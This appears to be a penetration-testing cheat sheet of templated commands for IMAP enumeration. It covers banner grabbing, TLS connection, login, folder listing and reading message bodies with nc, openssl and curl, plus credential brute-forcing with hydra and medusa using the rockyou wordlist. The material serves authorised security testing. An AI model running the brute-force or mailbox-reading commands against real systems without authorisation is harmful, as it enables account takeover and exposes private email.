# IMAP Enumeration

> Interacting with IMAP mail services for credential and content access

<!-- tags: imap,mail,enum,bruteforce -->

---

## grab banner telnet
Connect raw to the IMAP service with telnet.

```bash
telnet {{TARGET:ip}} {{PORT:port:143}}
```

<!-- meta: risk=safe | phase=enum | tags=banner,telnet -->

---

## connect imaps tls openssl
Connect to IMAPS over TLS for STARTTLS-less connections.

```bash
openssl s_client -connect {{TARGET:ip}}:{{PORT:port:993}}
```

<!-- meta: risk=safe | phase=enum | tags=imaps,ssl -->

---

## login authenticated
Authenticate to the IMAP service from inside an interactive session.

```bash
echo "a LOGIN {{USERNAME:str}} {{PASSWORD:str}}" | nc {{TARGET:ip}} {{PORT:port:143}}
```

<!-- meta: risk=safe | phase=enum | tags=login,auth -->

---

## list mailboxes folders
List all available folders for the authenticated user.

```bash
{ echo "a LOGIN {{USERNAME:str}} {{PASSWORD:str}}"; echo 'b LIST "" "*"'; sleep 1; } | nc {{TARGET:ip}} {{PORT:port:143}}
```

<!-- meta: risk=safe | phase=enum | tags=list,folders -->

---

## read message body inbox
Read the body text of message 1 in INBOX.

```bash
{ echo "a LOGIN {{USERNAME:str}} {{PASSWORD:str}}"; echo "b SELECT INBOX"; echo "c FETCH 1 BODY[TEXT]"; sleep 2; } | nc {{TARGET:ip}} {{PORT:port:143}}
```

<!-- meta: risk=safe | phase=enum | tags=fetch,read -->

---

## brute login imaps hydra
Brute force credentials over IMAPS port 993.

```bash
hydra -L {{USERLIST:file:users.txt}} -P {{PASSLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -e nsr -f -V imap://{{TARGET:ip}}
```

<!-- meta: risk=med | phase=passwords | tags=hydra,brute-force -->

---

## brute login medusa
Use Medusa's IMAP module for credential testing.

```bash
medusa -h {{TARGET:ip}} -U {{USERLIST:file:users.txt}} -P {{PASSLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -M imap
```

<!-- meta: risk=med | phase=passwords | tags=medusa,brute-force -->

---

## test login curl
Test single credentials with curl.

```bash
curl -u {{USERNAME:str}}:{{PASSWORD:str}} --url "imap://{{TARGET:ip}}:{{PORT:port:143}}/"
```

<!-- meta: risk=safe | phase=enum | tags=curl,probe -->
